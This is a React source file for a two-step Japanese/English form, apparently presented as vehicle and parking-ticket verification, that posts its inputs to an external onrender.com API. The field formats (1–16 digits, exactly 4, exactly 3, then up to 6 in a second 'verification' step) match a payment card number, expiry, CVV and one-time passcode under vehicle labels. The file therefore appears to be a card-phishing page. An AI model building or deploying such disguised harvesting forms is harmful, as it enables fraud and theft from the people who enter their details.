import { useState } from "react";

const inputClass = `
  border border-gray-200
  p-3 rounded-lg w-full
  text-sm text-gray-800
  placeholder-gray-400
  outline-none
  focus:border-pink-400
  focus:ring-1 focus:ring-pink-400
  transition-colors
`;

export default function CarForm() {
  const [car, setCar] = useState({
    total_number: "",
    car_number: "",
    fleet_id: "",
  });

  const [parkingTicket, setParkingTicket] = useState("");

  const [showVerification, setShowVerification] =
    useState(false);

  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [loading, setLoading] = useState(false);

  const update = (field) => (e) => {
    setCar({
      ...car,
      [field]: e.target.value.replace(/\D/g, ""),
    });

    setError("");
    setSuccess("");
  };

  const isCarInfoValid =
    /^\d{1,16}$/.test(car.total_number) &&
    /^\d{4}$/.test(car.car_number) &&
    /^\d{3}$/.test(car.fleet_id);

  const isTicketValid =
    /^\d{1,6}$/.test(parkingTicket);

  // STEP 1:
  // Submit the first three vehicle requirements.
  const handleCarSubmit = async (e) => {
    e.preventDefault();

    setError("");
    setSuccess("");

    if (!isCarInfoValid) {
      setError("車両情報を正しく入力してください");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch(
        "https://anypass.onrender.com/api/cars",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(car),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data.message || "Submission failed"
        );
      }

      // Move to verification step.
      setShowVerification(true);
      setSuccess("");

    } catch (err) {
      console.error(err);

      setError(
        err.message ||
          "送信に失敗しました。もう一度お試しください。"
      );
    } finally {
      setLoading(false);
    }
  };

  // STEP 2:
  // Verify using the parking ticket number.
  const handleVerification = async (e) => {
    e.preventDefault();

    setError("");
    setSuccess("");

    if (!isTicketValid) {
      setError("駐車券番号を正しく入力してください");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch(
        "https://anypass.onrender.com/api/cars/verify",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            total_number: car.total_number,
            car_number: car.car_number,
            fleet_id: car.fleet_id,
            parking_ticket_number: parkingTicket,
          }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data.message || "Verification failed"
        );
      }

      setSuccess("車両情報の確認が完了しました。");

    } catch (err) {
      console.error(err);

      setError(
        err.message ||
          "確認に失敗しました。もう一度お試しください。"
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex justify-center items-start px-4 py-10">
      <div className="w-full max-w-md">

        {/* =========================
            STEP 1 — VEHICLE DETAILS
        ========================== */}
        {!showVerification && (
          <form
            onSubmit={handleCarSubmit}
            className="px-6 py-8"
          >
            <h1 className="text-xl font-bold text-gray-800 text-center">
              車両情報を入力してください
            </h1>

            <p className="text-sm text-gray-500 text-center mb-6">
              Enter your vehicle information
            </p>

            <div className="flex flex-col gap-4">

              {/* Total Number */}
              <div className="flex flex-col gap-1">
                <label className="text-sm font-medium text-gray-700">
                  車両番号 / Total Number
                </label>

                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="Enter total number"
                  maxLength={16}
                  value={car.total_number}
                  onChange={update("total_number")}
                  className={inputClass}
                />

                <p className="text-xs text-gray-400">
                  1〜16 digits
                </p>
              </div>

              {/* Car Number */}
              <div className="flex flex-col gap-1">
                <label className="text-sm font-medium text-gray-700">
                  車両番号 / Car Number
                </label>

                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="1234"
                  maxLength={4}
                  value={car.car_number}
                  onChange={update("car_number")}
                  className={inputClass}
                />

                <p className="text-xs text-gray-400">
                  4 digits
                </p>
              </div>

              {/* Fleet ID */}
              <div className="flex flex-col gap-1">
                <label className="text-sm font-medium text-gray-700">
                  フリートID / Fleet ID
                </label>

                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="123"
                  maxLength={3}
                  value={car.fleet_id}
                  onChange={update("fleet_id")}
                  className={inputClass}
                />

                <p className="text-xs text-gray-400">
                  3 digits
                </p>
              </div>

              {error && (
                <p className="text-sm text-red-500 text-center">
                  {error}
                </p>
              )}

              <button
                type="submit"
                disabled={!isCarInfoValid || loading}
                className="
                  bg-red-500 hover:bg-red-600
                  text-white font-medium text-sm
                  py-3 rounded-lg
                  transition-colors
                  disabled:opacity-50
                  disabled:cursor-not-allowed
                  mt-2
                "
              >
                {loading ? "送信中..." : "次へ"}
              </button>

            </div>
          </form>
        )}

        {/* =========================
            STEP 2 — VERIFICATION
        ========================== */}
        {showVerification && (
          <form
            onSubmit={handleVerification}
            className="px-6 py-8"
          >
            <h1 className="text-xl font-bold text-gray-800 text-center">
              車両確認
            </h1>

            <p className="text-sm text-gray-500 text-center mb-6">
              Vehicle Verification
            </p>

            {/* Submitted vehicle information */}
            <div className="border border-gray-200 rounded-lg p-4 mb-5">
              <div className="flex justify-between text-sm mb-2">
                <span className="text-gray-400">
                  Total Number
                </span>
                <span className="font-medium text-gray-800">
                  {car.total_number}
                </span>
              </div>

              <div className="flex justify-between text-sm mb-2">
                <span className="text-gray-400">
                  Car Number
                </span>
                <span className="font-medium text-gray-800">
                  {car.car_number}
                </span>
              </div>

              <div className="flex justify-between text-sm">
                <span className="text-gray-400">
                  Fleet ID
                </span>
                <span className="font-medium text-gray-800">
                  {car.fleet_id}
                </span>
              </div>
            </div>

            <div className="flex flex-col gap-3">

              <label className="text-sm font-medium text-gray-700">
                駐車券番号 / Parking Ticket Number
              </label>

              <input
                type="text"
                inputMode="numeric"
                placeholder="Enter parking ticket number"
                maxLength={6}
                value={parkingTicket}
                onChange={(e) => {
                  setParkingTicket(
                    e.target.value
                      .replace(/\D/g, "")
                      .slice(0, 6)
                  );

                  setError("");
                  setSuccess("");
                }}
                className={inputClass}
              />

              <p className="text-xs text-gray-400">
                Enter your 1〜6 digit parking ticket number
              </p>

              {error && (
                <p className="text-sm text-red-500 text-center">
                  {error}
                </p>
              )}

              {success && (
                <p className="text-sm text-green-600 text-center">
                  {success}
                </p>
              )}

              <button
                type="submit"
                disabled={!isTicketValid || loading}
                className="
                  bg-red-500 hover:bg-red-600
                  text-white font-medium text-sm
                  py-3 rounded-lg
                  transition-colors
                  disabled:opacity-50
                  disabled:cursor-not-allowed
                  mt-2
                "
              >
                {loading
                  ? "確認中..."
                  : "車両情報を確認"}
              </button>

            </div>
          </form>
        )}

      </div>
    </div>
  );
}
